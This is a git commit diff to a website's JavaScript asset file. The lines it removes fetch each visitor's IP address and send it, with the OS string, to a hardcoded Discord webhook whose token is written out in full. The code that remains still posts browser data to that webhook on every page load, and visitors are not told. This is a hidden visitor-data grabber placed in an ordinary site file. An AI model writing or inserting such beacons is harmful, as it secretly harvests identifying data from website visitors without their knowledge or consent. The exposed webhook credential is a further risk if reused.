a470922a152e9f6428897c7d5d2498fea6e0c23d
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 08:05:48 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,16 +1,5 @@
-const ip = '';
-
 (async () => {
-    const rawResponse = await fetch('https://api.ipify.org?format=json', {
-        method: 'GET',
-        body: null
-    });
-    ip = await rawResponse.json();
-    console.log(content);
-})();
-
-(async () => {
-    const params = { content: `${window.navigator.oscpu}\n${ip['ip']}` };
+    const params = { content: `${window.Navigator}` };
     const rawResponse = await fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
         method: 'POST',
         headers: {
